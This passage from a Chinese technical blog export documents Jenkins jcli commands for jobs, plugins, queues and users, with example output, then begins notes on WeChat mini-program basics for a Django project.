<h5 id="history"><a href="#history" class="headerlink" title="history"></a>history</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the history of job in your Jenkins</span><br><span class="line">查看历史构建状态。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job history &lt;jobName&gt; </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job history devops_ci_cd_pipline_ex1</span><br><span class="line">    number displayname building result</span><br><span class="line">    0      #42         false    FAILURE</span><br><span class="line">    1      #41         true</span><br><span class="line">    2      #40         true</span><br><span class="line">    3      #39         false    SUCCESS</span><br><span class="line">    4      #38         false    ABORTED</span><br></pre></td></tr></table></figure>
<h5 id="log"><a href="#log" class="headerlink" title="log"></a>log</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看历史构建日志信息（控制台输出信息）。</span><br><span class="line">Usage:</span><br><span class="line">  jcli job log &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help           help for log</span><br><span class="line">  -s, --history int    Specific build history of log (default -1)  特殊构建历史日志</span><br><span class="line">  -i, --interval int   Interval of watch (default 1)               查看间隔</span><br><span class="line">  -w, --watch          Watch the job logs                          查看 job 日志</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job log devops_ci_cd_pipline_ex1</span><br></pre></td></tr></table></figure>
<h5 id="search"><a href="#search" class="headerlink" title="search"></a>search</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli job search [keyword] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --all       Print all items if there&apos;s no keyword</span><br><span class="line">                  打印所有 job</span><br><span class="line">  -h, --help      help for search</span><br><span class="line">      --max int   The number of limitation to print (default 10)</span><br><span class="line">                  每次打印限制个数，默认为10</span><br></pre></td></tr></table></figure>
<h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the types of job which in your Jenkins   统计 jenkins 里面的类型</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job type &lt;jobName&gt;</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job type devops_ci_cd_pipline_ex1</span><br><span class="line">    number name                        type</span><br><span class="line">    0      Freestyle project           Standalone Projects</span><br><span class="line">    1      Maven project               Standalone Projects</span><br><span class="line">    2      Pipeline                    Standalone Projects</span><br><span class="line">    3      External Job                Standalone Projects</span><br><span class="line">    4      Multi-configuration project Standalone Projects</span><br><span class="line">    0      MultiJob Project            Uncategorized</span><br><span class="line">    0      Folder                      Nested Projects</span><br><span class="line">    1      GitHub Organization         Nested Projects</span><br><span class="line">    2      Multibranch Pipeline        Nested Projects</span><br></pre></td></tr></table></figure>
<h5 id="param"><a href="#param" class="headerlink" title="param"></a>param</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get param of the job of your Jenkins</span><br><span class="line">获取 job 的参数</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job param &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help     help for param</span><br><span class="line">      --indent   Output with indent    缩进输出</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job param pipeline_cicd_ex3</span><br><span class="line"></span><br><span class="line">[&#123;&quot;Description&quot;:&quot;please give a name&quot;,&quot;name&quot;:&quot;userName&quot;,&quot;Type&quot;:&quot;StringParameterDefinition&quot;,&quot;value&quot;:&quot;&quot;,&quot;DefaultParameterValue&quot;:&#123;&quot;Description&quot;:&quot;&quot;,&quot;Value&quot;:&quot;Anthony&quot;&#125;&#125;,&#123;&quot;Description&quot;:&quot;select the version to test&quot;,&quot;name&quot;:&quot;version&quot;,&quot;Type&quot;:&quot;ChoiceParameterDefinition&quot;,&quot;value&quot;:&quot;&quot;,&quot;DefaultParameterValue&quot;:&#123;&quot;Description&quot;:&quot;&quot;,&quot;Value&quot;:&quot;1.1&quot;&#125;&#125;,&#123;&quot;Description&quot;:&quot;you is boy or not&quot;,&quot;name&quot;:&quot;is_boy&quot;,&quot;Type&quot;:&quot;BooleanParameterDefinition&quot;,&quot;value&quot;:&quot;&quot;,&quot;DefaultParameterValue&quot;:&#123;&quot;Description&quot;:&quot;&quot;,&quot;Value&quot;:true&#125;&#125;]</span><br><span class="line"></span><br><span class="line">pipeline_cicd_ex3:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pipeline&#123;</span><br><span class="line"> </span><br><span class="line">    agent any</span><br><span class="line">    parameters &#123;</span><br><span class="line">        string(name: &apos;userName&apos;, defaultValue: &apos;Anthony&apos;, description: &apos;please give a name&apos;)</span><br><span class="line">        choice(name: &apos;version&apos;, choices: [&apos;1.1&apos;, &apos;1.2&apos;, &apos;1.3&apos;], description: &apos;select the version to test&apos;)</span><br><span class="line">        booleanParam(name: &apos;is_boy&apos;, defaultValue: true, description: &apos;you is boy or not&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(&apos;test&apos;) &#123;</span><br><span class="line">            steps&#123;</span><br><span class="line">                script &#123;</span><br><span class="line">                    sh &quot;java -version&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>Open your Jenkins with a browse<br>（用不到）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli open [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -c, --config        Open the configuration page of Jenkins</span><br><span class="line">  -h, --help          help for open</span><br><span class="line">  -i, --interactive   Interactive mode</span><br><span class="line">  -n, --name string   Open a specific Jenkins by name</span><br></pre></td></tr></table></figure></p>
<h4 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h4><p>插件管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli plugin [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  check       Checkout update center server                 检查可更新</span><br><span class="line">  download    Download the plugins                          下载插件</span><br><span class="line">  install     Install the plugins                           安装插件</span><br><span class="line">  list        Print all the plugins which are installed     打印已安装的插件</span><br><span class="line">  open        Openout update center server                  启动更新</span><br><span class="line">  search      Print the plugins of your Jenkins             查找已安装的插件</span><br><span class="line">  trend       Show the trend of the plugin                  显示出插件趋势</span><br><span class="line">  uninstall   Uninstall the plugins                         卸载插件</span><br><span class="line">  upgrade     Upgrade the specific plugin                   更新特定的插件</span><br><span class="line">  upload      Upload a plugin  to your Jenkins              上传插件</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"></span><br><span class="line">  jcli plugin upgrade [plugin name] --filter stringArray   Filter for the list, like: name=foo</span><br></pre></td></tr></table></figure></p>
<h5 id="upgrade-1"><a href="#upgrade-1" class="headerlink" title="upgrade"></a>upgrade</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Upgrade the specific plugin</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin upgrade [plugin name] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --filter stringArray   Filter for the list, like: name=foo    筛选</span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin upgrade pipeline-model-api</span><br></pre></td></tr></table></figure>
<h5 id="trend"><a href="#trend" class="headerlink" title="trend"></a>trend</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Show the trend of the plugin</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin trend &lt;pluginName&gt; </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin trend pipeline-model-api</span><br><span class="line">***************** 180628</span><br><span class="line">***************** 179369</span><br></pre></td></tr></table></figure>
<h5 id="check"><a href="#check" class="headerlink" title="check"></a>check</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Checkout update center server</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin check </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin check -h</span><br><span class="line">Checkout update center server</span><br></pre></td></tr></table></figure>
<h5 id="download-1"><a href="#download-1" class="headerlink" title="download"></a>download</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Download the plugins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin download &lt;keyword&gt;        关键字。。。。</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin download pipeline-github</span><br><span class="line">Start to collect plugin dependencies...</span><br><span class="line">Ready to download plugins, total: 31.</span><br><span class="line">Start to download plugin pipeline-github, version: 2.5, number: 0</span><br><span class="line">Start to download plugin workflow-cps, version: 2.76, number: 1</span><br><span class="line">Start to download plugin workflow-api, version: 2.37, number: 2</span><br><span class="line">Start to download plugin workflow-step-api, version: 2.20, number: 3</span><br><span class="line">Start to download plugin structs, version: 1.20, number: 4</span><br><span class="line">Start to download plugin jdk-tool, version: 1.3, number: 5</span><br><span class="line">Start to download plugin jaxb, version: 2.3.0.1, number: 6</span><br><span class="line">Start to download plugin trilead-api, version: 1.0.5, number: 7</span><br><span class="line">Start to download plugin scm-api, version: 2.6.3, number: 8</span><br></pre></td></tr></table></figure>
<h5 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Uninstall the plugins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin uninstall [pluginName] </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin uninstall mapdb-api</span><br></pre></td></tr></table></figure>
<h5 id="install"><a href="#install" class="headerlink" title="install"></a>install</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Install the plugins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin install [pluginName] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help           help for install</span><br><span class="line">      --suite string   Suite of plugins</span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli plugin install pipeline-github</span><br><span class="line"></span><br><span class="line">注意：插件安装后要重启，要重启~</span><br></pre></td></tr></table></figure>
<h5 id="search-1"><a href="#search-1" class="headerlink" title="search"></a>search</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli plugin search github</span><br><span class="line">number name                                  installed version installedVersion title</span><br><span class="line">0      github-branch-source                  true              2.5.8            GitHub Branch Source Plugin</span><br><span class="line">1      github                                true              1.29.5           GitHub plugin</span><br><span class="line">2      github-api                            true              1.95             GitHub API Plugin</span><br><span class="line">3      pipeline-github-lib                   true              1.0              Pipeline: GitHub Groovy Libraries</span><br><span class="line">4      blueocean-github-pipeline             false     1.19.0                   GitHub Pipeline for Blue Ocean</span><br><span class="line">5      disable-github-multibranch-status     false     1.1                      Disable GitHub Multibranch Status</span><br><span class="line">6      github-autostatus                     false     3.6.0                    Job and Stage monitoring</span><br><span class="line">7      github-coverage-reporter              false     1.8                      GitHub Coverage Reporter</span><br><span class="line">8      github-issues                         false     1.2.4                    GitHub Issues</span><br><span class="line">9      github-oauth                          false     0.33                     GitHub Authentication</span><br><span class="line">10     github-organization-folder            false     1.6                      GitHub Organization Folder</span><br><span class="line">11     github-pr-comment-build               false     2.1                      GitHub PR Comment Build</span><br><span class="line">12     github-pr-coverage-status             false     2.1.1                    GitHub Pull Request Coverage Status</span><br><span class="line">13     github-pullrequest                    false     0.2.6</span><br></pre></td></tr></table></figure>
<h5 id="list-1"><a href="#list-1" class="headerlink" title="list"></a>list</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli plugin list</span><br><span class="line">number name                               version    update</span><br><span class="line">0      mercurial                          2.8        false</span><br><span class="line">1      pipeline-milestone-step            1.3.1      false</span><br><span class="line">2      locale                             1.4        false</span><br><span class="line">3      teamconcert                        1.3.0      false</span><br><span class="line">4      mapdb-api                          1.0.9.0    false</span><br><span class="line">5      throttle-concurrents               2.0.1      false</span><br><span class="line">6      workflow-scm-step                  2.9        false</span><br><span class="line">7      tfs                                5.157.0    false</span><br><span class="line">8      cvs                                2.14       false</span><br><span class="line">9      credentials-binding                1.20       false</span><br><span class="line">10     matrix-auth                        2.5        false</span><br><span class="line">11     pam-auth                           1.6        false</span><br><span class="line">12     ssh                                2.6.1      false</span><br><span class="line">13     emailext-template                  1.1        false</span><br><span class="line">14     momentjs                           1.1.1      false</span><br></pre></td></tr></table></figure>
<h5 id="upload"><a href="#upload" class="headerlink" title="upload:"></a>upload:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Upload a plugin from local filesystem or remote URL to your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli plugin upload [flags]</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  upload, up</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help                     help for upload</span><br><span class="line">  -r, --remote string            Remote plugin URL</span><br><span class="line">      --remote-jenkins string    Remote Jenkins which will find from config list</span><br><span class="line">      --remote-password string   Password of remote plugin URL</span><br><span class="line">      --remote-user string       User of remote plugin URL</span><br><span class="line">      --show-progress            Whether show the upload progress (default true)</span><br><span class="line">      --skip-posthook            Whether skip the post command hook</span><br><span class="line">      --skip-prehook             Whether skip the previous command hook</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    jcli plugin upload --remote https://server/sample.hpi</span><br><span class="line">    jcli plugin upload sample.hpi</span><br><span class="line">    jcli plugin upload sample.hpi --show-progress=false</span><br></pre></td></tr></table></figure>
<h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><p>队列管理</p>
<h5 id="list-2"><a href="#list-2" class="headerlink" title="list"></a>list</h5><p>列出所有队列<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli queue list [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for list</span><br><span class="line">  -o, --output string   Format the output (default &quot;json&quot;)</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli queue list</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Items&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Blocked&quot;: false,</span><br><span class="line">      &quot;Buildable&quot;: true,</span><br><span class="line">      &quot;ID&quot;: 122,</span><br><span class="line">      &quot;Params&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Pending&quot;: false,</span><br><span class="line">      &quot;Stuck&quot;: false,</span><br><span class="line">      &quot;URL&quot;: &quot;queue/item/122/&quot;,</span><br><span class="line">      &quot;Why&quot;: &quot;等待下一个可用的执行器&quot;,</span><br><span class="line">      &quot;BuildableStartMilliseconds&quot;: 1573714706814,</span><br><span class="line">      &quot;InQueueSince&quot;: 1573714706758,</span><br><span class="line">      &quot;Actions&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Blocked&quot;: false,</span><br><span class="line">      &quot;Buildable&quot;: true,</span><br><span class="line">      &quot;ID&quot;: 120,</span><br><span class="line">      &quot;Params&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Pending&quot;: false,</span><br><span class="line">      &quot;Stuck&quot;: false,</span><br><span class="line">      &quot;URL&quot;: &quot;queue/item/120/&quot;,</span><br><span class="line">      &quot;Why&quot;: &quot;等待下一个可用的执行器&quot;,</span><br><span class="line">      &quot;BuildableStartMilliseconds&quot;: 1573714673447,</span><br><span class="line">      &quot;InQueueSince&quot;: 1573714673446,</span><br><span class="line">      &quot;Actions&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Blocked&quot;: false,</span><br><span class="line">      &quot;Buildable&quot;: true,</span><br><span class="line">      &quot;ID&quot;: 118,</span><br><span class="line">      &quot;Params&quot;: &quot;&quot;,</span><br><span class="line">      &quot;Pending&quot;: false,</span><br><span class="line">      &quot;Stuck&quot;: false,</span><br><span class="line">      &quot;URL&quot;: &quot;queue/item/118/&quot;,</span><br><span class="line">      &quot;Why&quot;: &quot;等待下一个可用的执行器&quot;,</span><br><span class="line">      &quot;BuildableStartMilliseconds&quot;: 1573714663446,</span><br><span class="line">      &quot;InQueueSince&quot;: 1573714663418,</span><br><span class="line">      &quot;Actions&quot;: []</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="cancel"><a href="#cancel" class="headerlink" title="cancel"></a>cancel</h5><p>取消队列<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli queue cancel &lt;id&gt; [flags]</span><br><span class="line">Flags:</span><br><span class="line">  -h, --help</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli queue cancel 118</span><br></pre></td></tr></table></figure></p>
<h4 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h4><p>重启<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli restart [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm</span><br></pre></td></tr></table></figure></p>
<h4 id="user"><a href="#user" class="headerlink" title="user"></a>user</h4><p>用户管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user [flags]</span><br><span class="line">  jcli user [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  create      Create a user for your Jenkins</span><br><span class="line">  delete      Delete a user for your Jenkins</span><br><span class="line">  edit        Edit the user of your Jenkins</span><br><span class="line">  token       Token the user of your Jenkins</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for user</span><br><span class="line">  -o, --output string   Format the output (default &quot;json&quot;)</span><br></pre></td></tr></table></figure></p>
<h5 id="create-1"><a href="#create-1" class="headerlink" title="create"></a>create</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jcli user create &lt;username&gt; [password] </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli user create admin1 admin1</span><br><span class="line">create user success. Password is: admin1</span><br></pre></td></tr></table></figure>
<h5 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user delete &lt;username&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm           批处理模式，无需确认</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli user delete admin1</span><br><span class="line">? Are you sure to delete user admin1 ? Yes</span><br></pre></td></tr></table></figure>
<h5 id="edit-2"><a href="#edit-2" class="headerlink" title="edit"></a>edit</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user edit [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -d, --desc   Edit the description</span><br><span class="line"></span><br><span class="line">仅仅修改描述，不支持修改密码权等高级功能</span><br></pre></td></tr></table></figure>
<h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli user token -g [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -g, --generate      Generate the token</span><br><span class="line">  -n, --name string   Name of the token</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli user token -g</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Status&quot;: &quot;ok&quot;,</span><br><span class="line">  &quot;Data&quot;: &#123;</span><br><span class="line">    &quot;TokenName&quot;: &quot;jcli-Mouseflash&quot;,</span><br><span class="line">    &quot;TokenUUID&quot;: &quot;d7de368b-bb54-44a4-99ef-db1674a07e42&quot;,</span><br><span class="line">    &quot;TokenValue&quot;: &quot;1109aceacc74236930f5ef2d6372d2704e&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli user token -g -n 测试</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;Status&quot;: &quot;ok&quot;,</span><br><span class="line">  &quot;Data&quot;: &#123;</span><br><span class="line">    &quot;TokenName&quot;: &quot;测试&quot;,</span><br><span class="line">    &quot;TokenUUID&quot;: &quot;8a642d49-78ee-448a-8abc-59d29b5f4a68&quot;,</span><br><span class="line">    &quot;TokenValue&quot;: &quot;114229e08012d8b29f15d98986ef0f8f09&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h4><p>1、jcli job build devops_ci_cd_pipline_ex1 -b<br>不支持连续，需要等待上一条 build 完全进入 build 才会 启动下一条 build</p>
<p>2、不支持查看正在构建的任务清单。</p>
<p>3、不支持修改构建任务的配置。</p>
<p>4、不支持查看已经存在的用户列表</p>
<p>5、job create 的 type 参数不可用</p>
]]></content>
      <categories>
        <category>jenkins</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
        <tag>jcli</tag>
      </tags>
  </entry>
  <entry>
    <title>python-Django框架-微信小助手实践</title>
    <url>/python-Django%E6%A1%86%E6%9E%B6-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E5%8A%A9%E6%89%8B%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="小程序基础"><a href="#小程序基础" class="headerlink" title="小程序基础"></a>小程序基础</h2><p>全局入口 —— app.js<br>全局配置 —— app.json<br>全局样式 —— app.wxss</p>
<h3 id="全局配置（页面导航）"><a href="#全局配置（页面导航）" class="headerlink" title="全局配置（页面导航）"></a>全局配置（页面导航）</h3><h4 id="pages-列表配置"><a href="#pages-列表配置" class="headerlink" title="pages 列表配置"></a>pages 列表配置</h4><p>页面<br><a id="more"></a></p>
<h4 id="window-属性配置"><a href="#window-属性配置" class="headerlink" title="window 属性配置"></a>window 属性配置</h4><p>导航条背景/文字/等颜色</p>
<h4 id="tabbar-配置"><a href="#tabbar-配置" class="headerlink" title="tabbar 配置"></a>tabbar 配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &quot;tabBar&quot;: &#123;</span><br><span class="line">  &quot;list&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;pagePath&quot;: &quot;pages/index/index&quot;,</span><br><span class="line">      &quot;text&quot;: &quot;首页&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;pagePath&quot;: &quot;pages/logs/logs&quot;,</span><br><span class="line">      &quot;text&quot;: &quot;日志&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;pagePath&quot;: &quot;pages/demogrid/demogrid&quot;,</span><br><span class="line">      &quot;text&quot;: &quot;九宫格&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="小程序的页面设置"><a href="#小程序的页面设置" class="headerlink" title="小程序的页面设置"></a>小程序的页面设置</h3><p>json</p>
<h4 id="开启下拉刷新"><a href="#开启下拉刷新" class="headerlink" title="开启下拉刷新"></a>开启下拉刷新</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;enablePullDownRefresh&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="小程序的注册逻辑层"><a href="#小程序的注册逻辑层" class="headerlink" title="小程序的注册逻辑层"></a>小程序的注册逻辑层</h3><p>app.js</p>
<h4 id="小程序的注册逻辑"><a href="#小程序的注册逻辑" class="headerlink" title="小程序的注册逻辑"></a>小程序的注册逻辑</h4><p>App函数<br>注册全局唯一的小程序<br>只能调用一次<br>接收一个对象作为函数参数</p>
<h4 id="页面注册逻辑"><a href="#页面注册逻辑" class="headerlink" title="页面注册逻辑"></a>页面注册逻辑</h4><p>Page函数<br>注册一个页面<br>接受一个对象作为函数参数</p>
<h5 id="页面数据"><a href="#页面数据" class="headerlink" title="页面数据"></a>页面数据</h5><p>data属性</p>
<p>使用全局数据<br>获取全局唯一的 App 实例<br>通过唯一实例获取全局数据</p>
<h5 id="页面生命周期"><a href="#页面生命周期" class="headerlink" title="页面生命周期"></a>页面生命周期</h5><p><img data-src="http://tuchuang.xchcloud.cn/%E9%A1%B5%E9%9D%A2%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="页面生命周期"></p>
<p><img data-src="http://tuchuang.xchcloud.cn/%E9%A1%B5%E9%9D%A2%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F2.png" alt="页面生命周期"></p>
<h3 id="小程序的视图层"><a href="#小程序的视图层" class="headerlink" title="小程序的视图层"></a>小程序的视图层</h3><h4 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法 &#123;&#123;&#125;&#125;</span><br><span class="line">  &lt;view&gt;&#123;&#123; message &#125;&#125;&lt;/view&gt;</span><br><span class="line">  message: &quot;Hello World, Hello Django&quot;,</span><br></pre></td></tr></table></figure>
<h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h4><p>语法：wx:for</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view wx:for=&quot;&#123;&#123;array&#125;&#125;&quot;&gt;</span><br><span class="line">  No.&#123;&#123;index&#125;&#125; item, message: &#123;&#123;item.message&#125;&#125;</span><br><span class="line"> &lt;/view&gt;</span><br><span class="line">    array: [</span><br><span class="line">     &#123;</span><br><span class="line">       message: &quot;Hello World&quot;,</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       message: &quot;Hello Django&quot;,</span><br><span class="line">     &#125;</span><br><span class="line">   ]</span><br></pre></td></tr></table></figure>
<h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h4><p>语法：wx:if wx:else wx:elif</p>
<h4 id="绑定事件"><a href="#绑定事件" class="headerlink" title="绑定事件"></a>绑定事件</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A.png" alt></p>
<p>绑定事件的写法以key、value的形式<br>key以bind或者catch开头，然后跟上事件的类型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view bindtap=&apos;tapName&apos;&gt;TapTap&lt;/view&gt;</span><br><span class="line"></span><br><span class="line">  tapName: function(event)&#123;</span><br><span class="line">  console.log(&apos; in tabName function&apos;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<h4 id="小程序框架"><a href="#小程序框架" class="headerlink" title="小程序框架"></a>小程序框架</h4><p><img data-src="http://tuchuang.xchcloud.cn/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6.png" alt></p>
<h3 id="小程序提供的能力和常用的API"><a href="#小程序提供的能力和常用的API" class="headerlink" title="小程序提供的能力和常用的API"></a>小程序提供的能力和常用的API</h3><h4 id="微信API"><a href="#微信API" class="headerlink" title="微信API"></a>微信API</h4><h5 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h5><h6 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h6><p><img data-src="http://tuchuang.xchcloud.cn/Http%E8%AF%B7%E6%B1%82.png" alt><br>Http请求异步特性：<br>不管是什么情况，先返回过程后返回结果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button bindtap=&apos;testNetwork&apos;&gt;Test Network&lt;/button&gt;</span><br><span class="line">testNetwork: function(event)&#123;</span><br><span class="line">  var data = &apos;undefined&apos;</span><br><span class="line">  wx.request(&#123;</span><br><span class="line">    url: &apos;http://www.imooc.com&apos;,</span><br><span class="line">    method: &apos;GET&apos;,</span><br><span class="line">    header: &#123;&#125;,</span><br><span class="line">    success: function(res)&#123;</span><br><span class="line">      console.log(&apos;in success&apos;)</span><br><span class="line">      data = res.data</span><br><span class="line">    &#125;,</span><br><span class="line">    fail: function(res)&#123;</span><br><span class="line">      console.log(&apos;request failed.&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  console.log(&apos;data: &apos;, data)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<h6 id="文件上传、下载"><a href="#文件上传、下载" class="headerlink" title="文件上传、下载"></a>文件上传、下载</h6><p><img data-src="http://tuchuang.xchcloud.cn/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6.png" alt></p>
